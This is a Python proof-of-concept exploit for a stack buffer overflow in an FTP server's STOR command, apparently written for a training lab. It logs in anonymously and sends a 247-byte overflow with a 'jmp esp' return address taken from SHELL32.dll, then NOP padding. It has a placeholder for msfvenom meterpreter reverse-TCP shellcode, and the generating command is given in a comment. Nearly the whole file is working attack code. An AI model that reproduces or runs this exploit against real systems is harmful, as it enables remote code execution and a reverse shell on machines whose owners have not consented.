#!/usr/bin/env python3
import socket
import sys
from struct import pack

OFFSET = 247
BAD_CHARS = b"\x00\x0a\x0d"

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali_IP> LPORT=<ncat_port> EXITFUNC=thread -f python -b "\x00\x0a\x0d"
shellcode =  b""
# ...<snip>...

# This does not find anything, so we widen the search: !mona jmp -r esp -cpb "\x00"
# !mona find -type instr -s "jmp esp"
# Open c:\Program Files\Immunity Inc\Immunity Debugger\find.txt for all results. Unfortunately 
# Pick an address that has no bad characters.
# 0x764ff4cb (b+0x0001f4cb)  : "jmp esp" |  {PAGE_EXECUTE_READ} [SHELL32.dll] ASLR: True, Rebase: True, SafeSEH: True, OS: True, v10.0.19041.964 (C:\Windows\System32\SHELL32.dll)

# Exploit buffer
buf = b"A" * OFFSET
buf += pack("<I", 0x764ff4cb)   # "jmp esp" in shell32.dll found with mona (note: unstable with ASLR)
buf += b"C" * 8                 # Padding between EIP (247) and ESP contents (259)
buf += b"\x90" * 16             # NOPs for msfvenom payload decoding
buf += shellcode

# Optional safety check the buffer for bad characters
for c in buf:
    if c in BAD_CHARS:
        print(hex(c), 'in', buf[OFFSET:].hex())
        raise Exception("Bad character in buffer!")

if len(sys.argv) < 2:
    print("Usage: ./poc.py <target-IP>")
    exit()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(b'USER anonymous\r\n')
s.recv(1024)
s.send(b'PASS anonymous\r\n')
s.recv(1024)
s.send(b'STOR' + buf + b'\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.close()